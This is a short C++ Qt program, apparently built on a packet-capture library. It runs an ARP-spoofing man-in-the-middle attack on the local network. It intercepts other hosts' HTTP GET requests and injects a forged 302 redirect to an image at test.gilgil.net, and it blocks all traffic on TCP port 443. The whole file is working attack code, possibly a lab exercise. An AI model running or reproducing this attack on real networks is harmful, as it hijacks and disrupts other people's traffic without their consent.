#include <QCoreApplication>
#include <GAutoArpSpoof>
#include <GBpFilter>
#include <GTcpBlock>
#include <GBlock>
#include <GPcapDeviceWrite>
#include <GApp>

int main(int argc, char *argv[])
{
    GApp a(argc, argv);

    GAutoArpSpoof arpspoof;

    GPcapDeviceWrite writer;

    GBpFilter filter1;
    filter1.filter_ = "(port 80 and tcp[((tcp[12:1] & 0xf0) >> 2):4] = 0x47455420) && !(host 175.213.35.39)";

    GBpFilter filter2;
    filter2.filter_ = "tcp port 443";

    GTcpBlock tcpblock;
    tcpblock.backwardRst_ = false;
    tcpblock.backwardFin_ = true;
    tcpblock.backwardFinMsg_ = QStringList{"HTTP/1.0 302 Redirected\r\nLocation: http://test.gilgil.net/ek.jpg\r\n\r\n"};
    tcpblock.writer_ = &writer;

    GBlock block;

    QObject::connect(
                &arpspoof,
                SIGNAL(captured(GPacket*)),
                &filter1,
                SLOT(check(GPacket*)),
                Qt::DirectConnection
                );

    QObject::connect(
                &arpspoof,
                SIGNAL(captured(GPacket*)),
                &filter2,
                SLOT(check(GPacket*)),
                Qt::DirectConnection
                );

    QObject::connect(
                &filter1,
                SIGNAL(filtered(GPacket*)),
                &tcpblock,
                SLOT(block(GPacket*)),
                Qt::DirectConnection
                );

    QObject::connect(
                &filter2,
                SIGNAL(filtered(GPacket*)),
                &block,
                SLOT(block(GPacket*)),
                Qt::DirectConnection
                );

    writer.open();
    filter1.open();
    filter2.open();
    block.open();
    tcpblock.open();
    arpspoof.open();

    return a.exec();
}
